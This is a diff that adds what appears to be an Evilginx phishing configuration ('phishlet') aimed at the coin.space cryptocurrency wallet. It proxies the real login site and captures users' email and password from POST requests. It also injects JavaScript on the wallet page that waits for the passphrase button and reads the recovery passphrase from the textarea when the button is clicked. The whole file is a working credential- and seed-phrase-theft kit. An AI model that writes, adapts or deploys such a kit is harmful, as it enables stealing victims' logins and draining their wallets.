@@ -1,0 +1,37 @@
+
+author: '@Evi1Grey5'
+
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'coin.space', session: false, is_landing: true, auto_filter: true}
+auth_tokens:
+  - domain: '.coin.space'
+    keys: ['textareaValue']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'coin.space'
+  path: '/wallet/'
+js_inject:
+  - trigger_domains: ["coin.space"]
+    trigger_paths: ["/wallet/"]
+    script: |
+     function checkButton() {
+      const button = document.querySelector("#app > div > div > div > div > div.auth-step-layout__content > div.cs-button-group.cs-passphrase__buttons > button.cs-button.cs-button--primary");
+
+        if (button) {
+        clearInterval(intervalId);
+        button.addEventListener("click", () => {
+            const textareaValue = document.querySelector("#app > div > div > div > div > div.auth-step-layout__content > div.cs-passphrase__container > div > div > label > div.cs-form-element__wrapper > div > textarea").value;
+            console.log(textareaValue);
+        });
+      }
+      }
+const intervalId = setInterval(checkButton, 500);
